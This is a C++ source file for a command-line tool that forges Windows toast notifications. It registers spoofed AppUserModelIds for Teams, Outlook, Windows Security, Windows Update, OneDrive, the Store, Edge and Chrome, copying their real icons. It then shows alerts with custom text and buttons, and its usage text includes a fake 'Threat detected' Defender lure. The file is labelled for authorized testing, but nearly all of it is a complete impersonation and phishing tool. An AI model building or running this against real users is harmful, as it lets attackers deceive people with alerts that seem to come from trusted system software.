// FakeAumid.cpp
// Professional AUMID spoofing / toast phishing simulation tool.
// Build (x64 Developer Command Prompt, as normal user):
//   cl /EHsc /std:c++17 /W4 /DUNICODE /D_UNICODE FakeAumid.cpp ^
//      ole32.lib oleaut32.lib advapi32.lib runtimeobject.lib windowsapp.lib ^
//      shlwapi.lib shell32.lib uuid.lib
//
// FOR AUTHORIZED SECURITY TESTING ONLY.

#define _WIN32_WINNT 0x0A00
#include <windows.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <roapi.h>
#include <wrl.h>
#include <wrl/event.h>
#include <windows.foundation.h>
#include <windows.ui.notifications.h>
#include <windows.data.xml.dom.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <map>
#include <sstream>
#include <iomanip>
#include <ctime>

using namespace Microsoft::WRL;
using namespace Microsoft::WRL::Wrappers;
using namespace ABI::Windows::UI::Notifications;
using namespace ABI::Windows::Data::Xml::Dom;
using namespace ABI::Windows::Foundation;

// ============================================================
// Logging
// ============================================================
static std::wstring GetTempLogPath() {
    wchar_t tmp[MAX_PATH];
    GetTempPathW(MAX_PATH, tmp);
    return std::wstring(tmp) + L"FakeAumid.log";
}

static void Log(const std::wstring& msg) {
    std::wofstream f(GetTempLogPath(), std::ios::app);
    if (!f) return;
    time_t t = time(nullptr);
    wchar_t ts[64];
    wcsftime(ts, 64, L"%Y-%m-%d %H:%M:%S", localtime(&t));
    f << L"[" << ts << L"] " << msg << L"\n";
}

// ============================================================
// Spoof catalog: known-trusted AUMIDs + icon sources
// ============================================================
struct SpoofEntry {
    std::wstring aumid;         // AppUserModelId to register
    std::wstring displayName;   // shown as toast sender
    std::wstring iconSourceExe; // real EXE to pull icon from
    std::wstring category;      // for CLI selection
};

static const std::vector<SpoofEntry>& Catalog() {
    static const std::vector<SpoofEntry> v = {
        // Microsoft Teams (classic AUMID)
        { L"Microsoft.MicrosoftTeams_8wekyb3d8bbwe!Microsoft.MicrosoftTeams",
          L"Microsoft Teams",
          L"C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\msedgewebview2.exe",
          L"teams" },
        // Microsoft Teams (new)
        { L"MSTeams_8wekyb3d8bbwe!MSTeams",
          L"Microsoft Teams",
          L"C:\\Program Files\\WindowsApps\\MSTeams_8wekyb3d8bbwe\\ms-teams.exe",
          L"teams" },
        // Outlook (new)
        { L"Microsoft.OutlookForWindows_8wekyb3d8bbwe!MicrosoftOutlookForWindows",
          L"Outlook",
          L"C:\\Program Files\\WindowsApps\\Microsoft.OutlookForWindows_8wekyb3d8bbwe\\olk.exe",
          L"outlook" },
        // Windows Security (Defender UI)
        { L"Microsoft.Windows.SecHealthUI_cw5n1h2txyewy!SecHealthUI",
          L"Windows Security",
          L"C:\\Windows\\System32\\SecurityHealthUI.exe",
          L"defender" },
        // Windows Update
        { L"Microsoft.Windows.Update_8wekyb3d8bbwe!App",
          L"Windows Update",
          L"C:\\Windows\\System32\\MusNotification.exe",
          L"update" },
        // OneDrive
        { L"Microsoft.SkyDrive.Desktop",
          L"OneDrive",
          L"C:\\Windows\\System32\\OneDrive.exe",
          L"onedrive" },
        // Store
        { L"Microsoft.WindowsStore_8wekyb3d8bbwe!App",
          L"Microsoft Store",
          L"C:\\Windows\\System32\\WinStore.App.exe",
          L"store" },
        // Edge
        { L"MSEdge",
          L"Microsoft Edge",
          L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
          L"edge" },
        // Chrome
        { L"Chrome",
          L"Google Chrome",
          L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
          L"chrome" },
    };
    return v;
}

// ============================================================
// Icon extraction: pull a bitmap icon from an EXE and save to PNG
// so we can point IconUri at it (WinRT toast needs a file URI).
// ============================================================
static bool SaveIconFromExe(const std::wstring& exePath,
                            const std::wstring& outPngPath) {
    if (!PathFileExistsW(exePath.c_str()))
        return false;

    HICON hIcon = nullptr;
    UINT rid = 0;
    // Extract a 32x32 icon
    if (ExtractIconExW(exePath.c_str(), 0, nullptr, &hIcon, 1) > 0 && hIcon) {
        // Convert to 256x256 for crisp toast rendering
        HICON big = (HICON)CopyImage(hIcon, IMAGE_ICON, 256, 256,
                                     LR_COPYFROMRESOURCE);
        if (!big) big = (HICON)CopyImage(hIcon, IMAGE_ICON, 256, 256, 0);
        if (big) { DestroyIcon(hIcon); hIcon = big; }
    } else {
        // Fallback: SHGetFileInfo for icon-based extraction
        SHFILEINFOW sfi{};
        if (SHGetFileInfoW(exePath.c_str(), 0, &sfi, sizeof(sfi),
                           SHGFI_ICON | SHGFI_LARGEICON)) {
            hIcon = sfi.hIcon;
        }
    }
    if (!hIcon) return false;

    // Render to 32bpp DIB
    BITMAPINFO bmi{};
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = 256;
    bmi.bmiHeader.biHeight = -256;  // top-down
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    void* bits = nullptr;
    HDC hdc = GetDC(nullptr);
    HDC memDC = CreateCompatibleDC(hdc);
    HBITMAP hbm = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, &bits, nullptr, 0);
    HGDIOBJ old = SelectObject(memDC, hbm);
    DrawIconEx(memDC, 0, 0, hIcon, 256, 256, 0, nullptr, DI_NORMAL);
    SelectObject(memDC, old);

    // Encode DIB → PNG via WIC
    bool ok = false;
    IWICImagingFactory* wic = nullptr;
    if (SUCCEEDED(CoCreateInstance(CLSID_WICImagingFactory, nullptr,
                                   CLSCTX_INPROC_SERVER,
                                   IID_PPV_ARGS(&wic)))) {
        IWICBitmapEncoder* enc = nullptr;
        if (SUCCEEDED(wic->CreateEncoder(GUID_ContainerFormatPng, nullptr, &enc))) {
            IWICStream* stream = nullptr;
            wic->CreateStream(&stream);
            if (SUCCEEDED(stream->InitializeFromFilename(outPngPath.c_str(),
                                                         GENERIC_WRITE))) {
                enc->Initialize(stream, WICBitmapEncoderNoCache);
                IWICBitmapFrameEncode* frame = nullptr;
                IPropertyBag2* props = nullptr;
                if (SUCCEEDED(enc->CreateNewFrame(&frame, &props))) {
                    frame->Initialize(props);
                    frame->SetSize(256, 256);
                    WICPixelFormatGUID fmt = GUID_WICPixelFormat32bppBGRA;
                    frame->SetPixelFormat(&fmt);
                    // Write raw BGRA
                    UINT cbStride = 256 * 4;
                    UINT cbSize = cbStride * 256;
                    IWICBitmap* wbmp = nullptr;
                    wic->CreateBitmapFromMemory(256, 256,
                                                GUID_WICPixelFormat32bppBGRA,
                                                cbStride, cbSize,
                                                (BYTE*)bits, &wbmp);
                    frame->WriteSource(wbmp, nullptr);
                    if (wbmp) wbmp->Release();
                    frame->Commit();
                    frame->Release();
                    ok = true;
                }
                if (props) props->Release();
                enc->Commit();
            }
            if (stream) stream->Release();
            enc->Release();
        }
        wic->Release();
    }

    DeleteObject(hbm);
    DeleteDC(memDC);
    ReleaseDC(nullptr, hdc);
    DestroyIcon(hIcon);
    return ok;
}

// ============================================================
// Registry: register / unregister a spoofed AUMID
// ============================================================
static bool RegisterSpoof(const SpoofEntry& e, std::wstring* outIconPath) {
    std::wstring key = L"Software\\Classes\\AppUserModelId\\" + e.aumid;
    HKEY h;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, key.c_str(), 0, nullptr,
                        REG_OPTION_NON_VOLATILE, KEY_WRITE, nullptr,
                        &h, nullptr) != ERROR_SUCCESS)
        return false;

    RegSetValueExW(h, L"DisplayName", 0, REG_SZ,
                   (const BYTE*)e.displayName.c_str(),
                   (DWORD)((e.displayName.size() + 1) * sizeof(wchar_t)));

    // Extract icon
    if (outIconPath && !e.iconSourceExe.empty()) {
        wchar_t tmp[MAX_PATH];
        GetTempPathW(MAX_PATH, tmp);
        std::wstring iconPath = std::wstring(tmp) + L"aumid_" +
                                std::to_wstring(GetTickCount64()) + L".png";
        if (SaveIconFromExe(e.iconSourceExe, iconPath)) {
            std::wstring uri = L"file:///" + iconPath;
            for (auto& c : uri) if (c == L'\\') c = L'/';
            RegSetValueExW(h, L"IconUri", 0, REG_SZ,
                           (const BYTE*)uri.c_str(),
                           (DWORD)((uri.size() + 1) * sizeof(wchar_t)));
            *outIconPath = iconPath;
        }
    }
    RegCloseKey(h);
    return true;
}

static bool UnregisterSpoof(const std::wstring& aumid) {
    std::wstring key = L"Software\\Classes\\AppUserModelId\\" + aumid;
    return RegDeleteTreeW(HKEY_CURRENT_USER, key.c_str()) == ERROR_SUCCESS ||
           GetLastError() == ERROR_FILE_NOT_FOUND;
}

// ============================================================
// Toast XML builder
// ============================================================
static std::wstring XmlEscape(const std::wstring& s) {
    std::wstring o;
    for (wchar_t c : s) {
        switch (c) {
            case L'&':  o += L"&amp;";  break;
            case L'<':  o += L"&lt;";   break;
            case L'>':  o += L"&gt;";   break;
            case L'"':  o += L"&quot;"; break;
            case L'\'': o += L"&apos;"; break;
            default:    o += c;
        }
    }
    return o;
}

static std::wstring BuildToastXml(const std::wstring& title,
                                  const std::wstring& body,
                                  const std::wstring& heroImageUri,
                                  const std::vector<std::pair<std::wstring,
                                                              std::wstring>>& buttons) {
    std::wstringstream xs;
    xs << L"<toast scenario=\"reminder\">";
    xs << L"<visual><binding template=\"ToastGeneric\">";
    xs << L"<text>" << XmlEscape(title) << L"</text>";
    xs << L"<text>" << XmlEscape(body)  << L"</text>";
    if (!heroImageUri.empty())
        xs << L"<image placement=\"hero\" src=\"" << heroImageUri << L"\"/>";
    xs << L"</binding></visual>";
    if (!buttons.empty()) {
        xs << L"<actions>";
        for (auto& b : buttons) {
            xs << L"<action content=\"" << XmlEscape(b.first)
               << L"\" activationType=\"foreground\" arguments=\""
               << XmlEscape(b.second) << L"\"/>";
        }
        xs << L"</actions>";
    }
    xs << L"<audio silent=\"true\"/>";  // silent by default; disable for realism
    xs << L"</toast>";
    return xs.str();
}

// ============================================================
// Show toast on spoofed AUMID
// ============================================================
static bool ShowSpoofedToast(const std::wstring& aumid,
                             const std::wstring& title,
                             const std::wstring& body,
                             const std::wstring& heroUri,
                             const std::vector<std::pair<std::wstring,
                                                         std::wstring>>& buttons) {
    std::wstring xml = BuildToastXml(title, body, heroUri, buttons);

    // Load XML
    ComPtr<IXmlDocument> doc;
    HRESULT hr = RoActivateInstance(
        HStringReference(RuntimeClass_Windows_Data_Xml_Dom_XmlDocument).Get(),
        reinterpret_cast<IInspectable**>(doc.GetAddressOf()));
    if (FAILED(hr)) return false;
    ComPtr<IXmlDocumentIO> docIo;
    if (FAILED(doc.As(&docIo))) return false;
    if (FAILED(docIo->LoadXml(HStringReference(xml.c_str()).Get()))) return false;

    // Notifier
    ComPtr<IToastNotificationManagerStatics> mgr;
    hr = RoGetActivationFactory(
        HStringReference(RuntimeClass_Windows_UI_Notifications_ToastNotificationManager).Get(),
        IID_PPV_ARGS(mgr.GetAddressOf()));
    if (FAILED(hr)) return false;

    ComPtr<IToastNotifier> notifier;
    hr = mgr->CreateToastNotifierWithId(
        HStringReference(aumid.c_str()).Get(), notifier.GetAddressOf());
    if (FAILED(hr)) return false;

    // Factory
    ComPtr<IToastNotificationFactory> factory;
    hr = RoGetActivationFactory(
        HStringReference(RuntimeClass_Windows_UI_Notifications_ToastNotification).Get(),
        IID_PPV_ARGS(factory.GetAddressOf()));
    if (FAILED(hr)) return false;

    ComPtr<IToastNotification> toast;
    hr = factory->CreateToastNotification(doc.Get(), toast.GetAddressOf());
    if (FAILED(hr)) return false;

    hr = notifier->Show(toast.Get());
    return SUCCEEDED(hr);
}

// ============================================================
// CLI parsing
// ============================================================
struct Options {
    bool doRegister = false;
    bool doShow     = false;
    bool doCleanup  = false;
    bool listOnly   = false;
    std::wstring category;
    std::wstring customAumid;
    std::wstring customDisplay;
    std::wstring title;
    std::wstring body;
    std::wstring heroPath;
    std::vector<std::pair<std::wstring, std::wstring>> buttons;
};

static void PrintUsage() {
    wprintf(
        L"FakeAumid - AUMID spoofing / toast phishing simulation tool\n"
        L"\n"
        L"USAGE:\n"
        L"  FakeAumid.exe --list\n"
        L"  FakeAumid.exe --register --category <name>       (teams|outlook|defender|update|onedrive|store|edge|chrome)\n"
        L"  FakeAumid.exe --register --aumid <AUMID> --display <name> --icon <exe>\n"
        L"  FakeAumid.exe --show --category <name> --title <t> --body <b> [--hero <png>]\n"
        L"               [--button \"Text=arg\"]...\n"
        L"  FakeAumid.exe --cleanup --category <name>\n"
        L"  FakeAumid.exe --cleanup-all\n"
        L"\n"
        L"EXAMPLES:\n"
        L"  FakeAumid.exe --list\n"
        L"  FakeAumid.exe --register --category defender\n"
        L"  FakeAumid.exe --show --category defender --title \"Threat detected\" ^\n"
        L"                 --body \"Action required to remove malware\" ^\n"
        L"                 --button \"Remove now=clean\" --button \"Snooze=later\"\n"
        L"  FakeAumid.exe --cleanup --category defender\n"
    );
}

static const SpoofEntry* FindByCategory(const std::wstring& cat) {
    for (auto& e : Catalog())
        if (_wcsicmp(e.category.c_str(), cat.c_str()) == 0) return &e;
    return nullptr;
}

static bool ParseArgs(int argc, wchar_t** argv, Options& o) {
    for (int i = 1; i < argc; ++i) {
        std::wstring a = argv[i];
        auto next = [&](std::wstring& dst) {
            if (i + 1 < argc) { dst = argv[++i]; return true; }
            return false;
        };
        if (a == L"--list")       o.listOnly = true;
        else if (a == L"--register")     o.doRegister = true;
        else if (a == L"--show")         o.doShow = true;
        else if (a == L"--cleanup")      o.doCleanup = true;
        else if (a == L"--cleanup-all")  { o.doCleanup = true; o.category = L"__ALL__"; }
        else if (a == L"--category")     next(o.category);
        else if (a == L"--aumid")        next(o.customAumid);
        else if (a == L"--display")      next(o.customDisplay);
        else if (a == L"--icon")         next(o.customDisplay); // reused field
        else if (a == L"--title")        next(o.title);
        else if (a == L"--body")         next(o.body);
        else if (a == L"--hero")         next(o.heroPath);
        else if (a == L"--button") {
            std::wstring b; next(b);
            auto eq = b.find(L'=');
            if (eq != std::wstring::npos)
                o.buttons.emplace_back(b.substr(0, eq), b.substr(eq + 1));
        } else if (a == L"--help" || a == L"-h" || a == L"/?") {
            PrintUsage(); return false;
        } else {
            wprintf(L"[!] Unknown arg: %s\n", a.c_str());
            PrintUsage(); return false;
        }
    }
    return true;
}

// ============================================================
// Main
// ============================================================
int wmain(int argc, wchar_t** argv) {
    SetConsoleOutputCP(CP_UTF8);
    Options o;
    if (!ParseArgs(argc, argv, o)) return argc > 1 ? 1 : 0;

    HRESULT hr = RoInitialize(RO_INIT_MULTITHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) {
        wprintf(L"[!] RoInitialize failed 0x%08lX\n", (unsigned)hr);
        return 1;
    }

    if (argc <= 1 || o.listOnly) {
        PrintUsage();
        wprintf(L"\n--- Available spoof categories ---\n");
        for (auto& e : Catalog())
            wprintf(L"  %-12s  AUMID=%-70s  DisplayName=%s\n",
                    e.category.c_str(), e.aumid.c_str(), e.displayName.c_str());
        RoUninitialize();
        return 0;
    }

    int rc = 0;

    // Cleanup-all
    if (o.doCleanup && o.category == L"__ALL__") {
        for (auto& e : Catalog())
            UnregisterSpoof(e.aumid);
        Log(L"Cleaned all catalog AUMIDs");
        wprintf(L"[+] Removed all catalog AUMIDs from HKCU.\n");
        RoUninitialize();
        return 0;
    }

    // Resolve target
    SpoofEntry target;
    if (!o.customAumid.empty()) {
        target.aumid       = o.customAumid;
        target.displayName = o.customDisplay.empty() ? o.customAumid : o.customDisplay;
        target.iconSourceExe = L"";
        target.category    = L"custom";
    } else if (!o.category.empty()) {
        const SpoofEntry* e = FindByCategory(o.category);
        if (!e) {
            wprintf(L"[!] Unknown category: %s\n", o.category.c_str());
            RoUninitialize();
            return 1;
        }
        target = *e;
    } else if (o.doRegister || o.doShow || o.doCleanup) {
        wprintf(L"[!] --category or --aumid required.\n");
        RoUninitialize();
        return 1;
    }

    // Register
    if (o.doRegister) {
        std::wstring iconPath;
        if (RegisterSpoof(target, &iconPath)) {
            wprintf(L"[+] Registered AUMID: %s\n", target.aumid.c_str());
            wprintf(L"    DisplayName: %s\n", target.displayName.c_str());
            if (!iconPath.empty())
                wprintf(L"    Icon:        %s\n", iconPath.c_str());
            Log(L"Registered " + target.aumid);
        } else {
            wprintf(L"[!] Register failed.\n");
            rc = 1;
        }
    }

    // Show
    if (o.doShow) {
        std::wstring title = o.title.empty() ? L"Security Alert" : o.title;
        std::wstring body  = o.body.empty()  ? L"Action required." : o.body;
        bool ok = ShowSpoofedToast(target.aumid, title, body,
                                   o.heroPath, o.buttons);
        if (ok) {
            wprintf(L"[+] Toast shown via AUMID %s\n", target.aumid.c_str());
            Log(L"Toast shown: " + target.aumid + L" | " + title);
        } else {
            wprintf(L"[!] Show failed.\n");
            rc = 1;
        }
    }

    // Cleanup
    if (o.doCleanup && o.category != L"__ALL__") {
        if (UnregisterSpoof(target.aumid)) {
            wprintf(L"[+] Removed AUMID %s\n", target.aumid.c_str());
            Log(L"Unregistered " + target.aumid);
        } else {
            wprintf(L"[!] Cleanup failed (or not present).\n");
            rc = 1;
        }
    }

    RoUninitialize();
    return rc;
}
